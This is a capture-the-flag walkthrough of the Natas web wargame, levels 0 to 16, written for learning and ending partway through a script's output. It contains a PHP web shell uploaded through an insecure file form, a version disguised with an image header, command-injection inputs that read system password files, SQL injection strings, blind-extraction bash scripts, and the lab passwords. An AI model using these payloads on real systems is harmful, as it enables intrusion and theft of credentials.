# Natas Wargame

## Levels 0 - 10

### Level 0

- **Date**: 2026-03-05
- **URL**: `http://natas0.natas.labs.overthewire.org`
- **Password**: `natas0`
- **Tools**: Web Browser

#### The Solution

Right click on the page and select "View Page Source".

```html
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
```

#### The Lesson

Don't leave comments with sensitive information in your HTML source code!

---

### Level 1

- **Date**: 2026-03-05
- **URL**: `http://natas1.natas.labs.overthewire.org`
- **Password**: `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. Or use DevTools (F12) > Elements.

```html
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>
```

#### The Lesson

Disabling right-click does **not** prevent users from viewing the page source!

---

### Level 2

- **Date**: 2026-03-05
- **URL**: `http://natas2.natas.labs.overthewire.org`
- **Password**: `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
```

There is a `files` directory!
Browse to `http://natas2.natas.labs.overthewire.org/files/`.
There you will find `users.txt`!

```txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

#### The Lesson

Don't leave sensitive files in web-accessible directories!

---

### Level 3

- **Date**: 2026-03-07
- **URL**: `http://natas3.natas.labs.overthewire.org`
- **Password**: `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```

Search engines like Google ignore files and directories that are listed in a site's `robots.txt` file.

Browse to `http://natas3.natas.labs.overthewire.org/robots.txt`.

```txt
User-agent: *
Disallow: /s3cr3t/
```

Browse to the `http://natas3.natas.labs.overthewire.org/s3cr3t/` directory.
There is another file called `users.txt`!

```txt
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

#### The Lesson

Search engines may ignore robots.txt, but hackers do **not**!

---

### Level 4

- **Date**: 2026-03-07
- **URL**: `http://natas4.natas.labs.overthewire.org`
- **Password**: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
- **Tools**: Web Browser, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

Authorized users should come from `http://natas5.natas.labs.overthewire.org/`.
So let's check the `Referer` header of the HTTP request.
Use the browser's DevTools (F12) > Network tab to inspect the HTTP request headers.
Notice that there is no `Referer` header.

Let's use `curl` for this!

`curl` stands for "Client URL" and is a command-line tool for making HTTP requests.

To see the headers with `curl`:
```Powershell
curl.exe -v -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org
```

To add the `Referer` header with `curl`:
```Powershell
curl.exe -v -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
```

The `-e` flag is used to set the `Referer` header.

`curl` now gives the following response:
```html
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

#### The Lesson

Don't rely on the `Referer` header for security!

---

### Level 5

- **Date**: 2026-03-07
- **URL**: `http://natas5.natas.labs.overthewire.org`
- **Password**: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
Access disallowed. You are not logged in</div>
```

Even though we are logged in with the correct credentials, the page says we are not logged in.
Let's check the cookies!

Use the browser's DevTools (F12) > Application tab > Cookies and notice a cookie named `loggedin` with the value `0`.
You can just edit the value of the cookie here and set it to `1`!

Refresh the page and you will see:
```html
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
```

#### The Lesson

Don't rely on client-side cookies for authentication!

---

### Level 6

- **Date**: 2026-03-07
- **URL**: `http://natas6.natas.labs.overthewire.org`
- **Password**: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Open the source code (URL/index-source.html) and notice:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Notice `include "includes/secret.inc";`.
Let's check out `URL/includes/secret.inc`:

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Put this secret in the form and submit it. You will see:
```html
<div id="content">

Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

#### The Lesson

Don't include sensitive information in web-accessible **PHP** files!

---

### Level 7

- **Date**: 2026-03-07
- **URL**: `http://natas7.natas.labs.overthewire.org`
- **Password**: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

Notice that the `page` parameter is being passed to `index.php`.
Maybe we can use this to read files on the server?

The hint says the password for natas8 is in `/etc/natas_webpass/natas8`.
So let's try to read that file by passing it as the `page` parameter.

Try `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`.

You will see:
```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

#### The Lesson

Don't use `include($_GET['page']);` in `index.php` without proper validation!

---

### Level 8

- **Date**: 2026-03-07
- **URL**: `http://natas8.natas.labs.overthewire.org`
- **Password**: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
- **Tools**: Web Browser, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Notice the `encodeSecret` function. We can reverse it to get the original secret.

[level-08\decode.php](level-08\decode.php)
```php
<?php
echo base64_decode(strrev(hex2bin($argv[1]))) . "\n";
```

Run `php level-08\decode.php 3d3d516343746d4d6d6c315669563362` and you will get `oubWYf2kBq`.

Put this secret in the form and submit it. You will see:
```html
<div id="content">

Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
<form method=post>
```

#### The Lesson

Don't put the encoded secret and its encode function in your source code!

---

### Level 9

- **Date**: 2026-03-14
- **URL**: `http://natas9.natas.labs.overthewire.org`
- **Password**: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`
- **Tools**: Web Browser, `find`, `cat`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

Notice that the `$key` variable is being passed to the `grep` command <u>without any sanitization</u>!

So we can use **command injection** to read the password file.

With `test; cat` as the needle, the command becomes `grep -i test; cat dictionary.txt`.
Try this and you will see the contents of `dictionary.txt`!

Now let's try to find a 'password' file in the system with `test ; find / -name "*natas10*" 2>/dev/null ; cat`.
And we find a `/etc/natas_webpass/natas10` file!

Let's read it with `test ; cat /etc/natas_webpass/natas10`!

And we get `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`.

#### The Lesson

Don't pass user input to system commands without <u>proper sanitization</u>!

### Level 10

- **Date**: 2026-03-14
- **URL**: `http://natas10.natas.labs.overthewire.org`
- **Password**: `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
- **Tools**: Web Browser, `grep`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

So they learned from the previous level and added some filtering.

Let's check out that source code (URL/index-source.html):
```php
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

They have blocked the `;`, `|` and `&` characters.
But they forgot that `grep` can read multiple files!

We do need to match the password in order to get the contents of `/etc/natas_webpass/natas11`.
`grep` supports regex, so we can use `.*` to match all characters!

So try `.* /etc/natas_webpass/natas11 #` as the needle and you will see the contents of `/etc/natas_webpass/natas11`!
`#` just comments out `dictionary.txt` so it's not included in the output.

And you will get `/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk` in the output.

#### The Lesson

- `grep` can read multiple files!
- Don't rely on blacklisting certain characters for security!

## Levels 11 - 20

### Level 11

- **Date**: 2026-03-14
- **URL**: `http://natas11.natas.labs.overthewire.org`
- **Password**: `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
- **Tools**: Web Browser, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>


<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>
```

Notice `setcookie("data", base64_encode(xor_encrypt(json_encode($d))));`.
This means that the cookie is a base64 encoded, XOR encrypted JSON string!
`XOR` encryption is **symmetric**, so we can just use the same function to decrypt it!

And notice `$mydata['showpassword'] = $tempdata['showpassword'];`.
So if we set `showpassword` to `yes` in the **cookie**, it will be shown on the page!

<u>Why is XOR symmetric?</u>

- XOR with `1`: `b ^ 1 = ~b` and `~b ^ 1 = b`
- XOR with `0`: `b ^ 0 = b` and `b ^ b = 0`
- XOR with `k`: `b ^ k = c` and `c ^ k = b`

So `plaintext XOR key = ciphertext` and `ciphertext XOR key = plaintext`.

[level-11\cookie.php](level-11\cookie.php)
```php
<?php

if ($argc < 2) {
  die("Usage: php {$argv[0]} COOKIE_VALUE\n");
}

$default_cookie = $argv[1];

$known_plaintext = json_encode([
  "showpassword" => "no",
  "bgcolor" => "#ffffff"
]);

# XOR is symmetric
# plaintext XOR key = ciphertext
# ciphertext XOR key = plaintext

# Why?
# b ^ 1 = ~b and b ^ ~b = 1
# b ^ 0 = b and b ^ b = 0
# b ^ k = c and c ^ k = b

function xor_encrypt($data, $key)
{
  $out = '';
  for ($i = 0; $i < strlen($data); $i++) {
    $out .= $data[$i] ^ $key[$i % strlen($key)];
    # $key[$i % strlen($key)] : repeats the key if it's shorter than the data!
  }
  return $out;
}

$cipher = base64_decode($default_cookie);

$key_stream = '';

for ($i = 0; $i < strlen($cipher); $i++) {
  $key_stream .= $cipher[$i] ^ $known_plaintext[$i % strlen($known_plaintext)];
}

echo "Recovered keystream: " . $key_stream . "\n";

echo "Enter key length: ";
$key_length = intval(trim(fgets(STDIN)));
$key = substr($key_stream, 0, $key_length);
echo "\nRecovered key: $key\n\n";

$new_plaintext = json_encode([
  "showpassword" => "yes",
  "bgcolor" => "#ffffff"
]);

$new_cipher = xor_encrypt($new_plaintext, $key);
$new_cookie = base64_encode($new_cipher);
echo "New cookie value: $new_cookie\n";
```

Run `php level-11\cookie.php HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`.
Identify how long the key is by looking for repetitions in the keystream.
And you will get the new cookie value that you can set in the browser!

```powershell
Recovered keystream: eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeL
Enter key length: 4

Recovered key: eDWo

New cookie value: HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
```

Go to the browser's DevTools (F12) > Application tab > Cookies and set the `data` cookie to `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`.

Refresh the page and you will see:
```html
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

#### The Lesson

Don't use **XOR encryption** for sensitive data because it's easily breakable with known **plaintext attacks**!

### Level 12

- **Date**: 2026-03-15
- **URL**: `http://natas12.natas.labs.overthewire.org`
- **Password**: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
- **Tools**: Web Browser, `curl`, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="lnpldob3zh.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Notice `<input name="uploadedfile" type="file" /><br />`.
This means we can upload a file to the server! Like a PHP shell script...

Let's create a PHP shell script called `shell.php` with the following content:

```php
<?php system($_GET["cmd"]);
```

This script will execute the command passed in the `cmd` GET parameter and return the output.
Effectively giving us remote shell access to the server!

Let's upload this file to the server with `curl`:
```powershell
curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "uploadedfile=@shell.php" http://natas12.natas.labs.overthewire.org/
```

But the returned HTML does not contain a valid uploaded file path!

Notice `<input type="hidden" name="filename" value="lnpldob3zh.jpg" />`.
This means that the filename is sent by the browser as part of the HTTP request.
The server likely uses this value as the filename when saving the uploaded file.

So we need to set the filename to `shell.php` when uploading the file with `curl`!
```powershell
curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -F "filename=shell.php" -F "uploadedfile=@shell.php" http://natas12.natas.labs.overthewire.org/
```

Now we get:
```html
The file <a href="upload/4y97gpnavy.php">upload/4y97gpnavy.php</a> has been uploaded
```

Use the cmd GET parameter to run `cat /etc/natas_webpass/natas13`:
```powershell
curl.exe -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB "http://natas12.natas.labs.overthewire.org/upload/4y97gpnavy.php?cmd=cat%20/etc/natas_webpass/natas13"
```
Spaces in URLs must be encoded as `%20`.

And the `curl` command returns:
```txt
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

#### The Lesson

Never trust **client‑controlled input** (such as hidden form fields) when handling file uploads.

### Level 13

- **Date**: 2026-03-16
- **URL**: `http://natas13.natas.labs.overthewire.org`
- **Password**: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`
- **Tools**: Web Browser, `curl`, `PHP`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
For security reasons, we now only accept image files!<br/><br/>


<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="inos8ptir9.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

Notice `exif_imagetype($_FILES['uploadedfile']['tmp_name'])`.
This function checks the MIME type of the file to see if it's a valid image.

`exif_imagetype()` reads the first bytes of an image and checks its signature.
From [https://www.php.net/manual/en/function.exif-imagetype.php](https://www.php.net/manual/en/function.exif-imagetype.php).

So we can spoof the MIME type of our `shell.php` file to make it look like a valid image file!

Our new `shell.php` file:
```php
GIF89a
<?php system($_GET['cmd']);
```

Upload the file again with `curl`:
```powershell
curl.exe -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -F "filename=shell.php" -F "uploadedfile=@shell.php" http://natas13.natas.labs.overthewire.org/
```

We get:
```html
The file <a href="upload/x1ui4eh89u.php">upload/x1ui4eh89u.php</a> has been uploaded
```

And use the cmd GET parameter to run `cat /etc/natas_webpass/natas14`:
```powershell
curl.exe -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC "http://natas13.natas.labs.overthewire.org/upload/x1ui4eh89u.php?cmd=cat%20/etc/natas_webpass/natas14"
```

And we get:
```txt
GIF89a
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

#### The Lesson

File headers can be **spoofed**, so they’re not reliable for security!

### Level 14

- **Date**: 2026-03-31
- **URL**: `http://natas14.natas.labs.overthewire.org`
- **Password**: `z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
- **Tools**: Web Browser, `SQL`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

Notice that the `username` and `password` parameters are being directly concatenated into the SQL query without any sanitization!

We can get all users from the database by making the query always true with `OR 1=1`:
```sql
SELECT * from users where username="" OR 1=1 # " and password=""
```
The `#` is used to comment out the rest of the query.

So fill in `username` with `" OR 1=1 #` and `password` with anything and submit the form.

And you will see:
```html
<div id="content">
Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

#### The Lesson

Use prepared statements to prevent **SQL injection**!

## Levels 15 - 20

### Level 15

- **Date**: 2026-03-31
- **URL**: `http://natas15.natas.labs.overthewire.org`
- **Password**: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
- **Tools**: Web Browser, `SQL`, `Bash`, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Notice that the `username` parameter is <u>again</u> being directly concatenated into the SQL query without any sanitization!
If the user exists, the query will execute successfully and the page will say "This user exists.".

Try `natas16" AND 1=1 #` to confirm that SQL injection is <u>possible</u>.

And you will see "This user exists.".

We can use `natas16" AND password LIKE BINARY "a%" #` as the username to extract the password <u>character by character</u>!

But this will take a long time, so let's write a script to automate this!

[level-15\blind_sql.bash](level-15\blind_sql.bash)
```bash
#!/bin/bash

[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }

URL="http://natas15.natas.labs.overthewire.org/"
AUTH="natas15:$1"

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password=""

for i in $(seq 1 32); do
  for c in $(echo $chars | fold -w1); do

    attempt="${password}${c}"

    response=$(curl -s -u $AUTH \
      --data "username=natas16\" AND password LIKE BINARY \"${attempt}%\" #" \
      "$URL")

    if echo "$response" | grep -q "This user exists"; then
      password+=$c
      echo "[+] $password (${#password}/32)"
      break
    fi

  done
done

echo "[✔] Password: $password"
```

Run `bash level-15/blind_sql.bash SdqIqBsFcz3yotlNYErZSZwblkm0lrvx` and you will get:
```powershell
[+] h (1/32)
[+] hP (2/32)
[+] hPk (3/32)
[+] hPkj (4/32)
[+] hPkjK (5/32)
[+] hPkjKY (6/32)
[+] hPkjKYv (7/32)
[+] hPkjKYvi (8/32)
[+] hPkjKYviL (9/32)
[+] hPkjKYviLQ (10/32)
[+] hPkjKYviLQc (11/32)
[+] hPkjKYviLQct (12/32)
[+] hPkjKYviLQctE (13/32)
[+] hPkjKYviLQctEW (14/32)
[+] hPkjKYviLQctEW3 (15/32)
[+] hPkjKYviLQctEW33 (16/32)
[+] hPkjKYviLQctEW33Q (17/32)
[+] hPkjKYviLQctEW33Qm (18/32)
[+] hPkjKYviLQctEW33Qmu (19/32)
[+] hPkjKYviLQctEW33QmuX (20/32)
[+] hPkjKYviLQctEW33QmuXL (21/32)
[+] hPkjKYviLQctEW33QmuXL6 (22/32)
[+] hPkjKYviLQctEW33QmuXL6e (23/32)
[+] hPkjKYviLQctEW33QmuXL6eD (24/32)
[+] hPkjKYviLQctEW33QmuXL6eDV (25/32)
[+] hPkjKYviLQctEW33QmuXL6eDVf (26/32)
[+] hPkjKYviLQctEW33QmuXL6eDVfM (27/32)
[+] hPkjKYviLQctEW33QmuXL6eDVfMW (28/32)
[+] hPkjKYviLQctEW33QmuXL6eDVfMW4 (29/32)
[+] hPkjKYviLQctEW33QmuXL6eDVfMW4s (30/32)
[+] hPkjKYviLQctEW33QmuXL6eDVfMW4sG (31/32)
[+] hPkjKYviLQctEW33QmuXL6eDVfMW4sGo (32/32)
[✔] Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

And the password for natas16 is `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`.

#### The Lesson

Don't reveal whether a user exists or not in your login error messages!
(And really do use prepared statements to prevent SQL injection!)

### Level 16

- **Date**: 2026-03-31
- **URL**: `http://natas16.natas.labs.overthewire.org`
- **Password**: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
- **Tools**: Web Browser, `SQL`, `Bash`, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Notice that they have added more characters to the blacklist, but they forgot about <u>command substitution</u> with `$()`!

We can use `$(grep ^passwordsofar /etc/natas_webpass/natas17)` to extract the password <u>character by character</u>!

The entire needle becomes `grep -i "$(grep ^passwordsofar /etc/natas_webpass/natas17)" dictionary.txt`.

- If `$(grep ^passwordsofar /etc/natas_webpass/natas17)` returns the `passwordsofar`, the output is empty (because the password is <u>not</u> in `dictionary.txt`).
- If `$(grep ^passwordsofar /etc/natas_webpass/natas17)` returns nothing, the output is the entire `dictionary.txt`!

<u>So empty output means correct password so far!</u>

We can use `! echo "$response" | grep -q "apple"` to check if the output is empty or not, because `dictionary.txt` contains "apple" but an empty output does not!

We'll automate this with a script again!

[level-16\blind_command_substitution.bash](level-16\blind_command_substitution.bash)
```bash
#!/bin/bash

[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }

URL="http://natas16.natas.labs.overthewire.org/"
AUTH="natas16:$1"

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password=""

for i in $(seq 1 32); do
  for c in $(echo $chars | fold -w1); do

    attempt="${password}${c}"

    response=$(curl -s -u $AUTH \
      --get --data-urlencode "needle=\$(grep ^${attempt} /etc/natas_webpass/natas17)" \
      "$URL")

    if ! echo "$response" | grep -q "apple"; then
      password+=$c
      echo "[+] $password (${#password}/32)"
      break
    fi

  done
done

echo "[✔] Password: $password"
```

Run `bash level-16/blind_command_substitution.bash hPkjKYviLQctEW33QmuXL6eDVfMW4sGo` and you will get:
```powershell
[+] E (1/32)
[+] Eq (2/32)
[+] Eqj (3/32)
[+] EqjH (4/32)
[+] EqjHJ (5/32)
[+] EqjHJb (6/32)
[+] EqjHJbo (7/32)
[+] EqjHJbo7 (8/32)
[+] EqjHJbo7L (9/32)
[+] EqjHJbo7LF (10/32)
[+] EqjHJbo7LFN (11/32)
[+] EqjHJbo7LFNb (12/32)
[+] EqjHJbo7LFNb8 (13/32)
[+] EqjHJbo7LFNb8v (14/32)
[+] EqjHJbo7LFNb8vw (15/32)
[+] EqjHJbo7LFNb8vwh (16/32)
[+] EqjHJbo7LFNb8vwhH (17/32)
[+] EqjHJbo7LFNb8vwhHb (18/32)
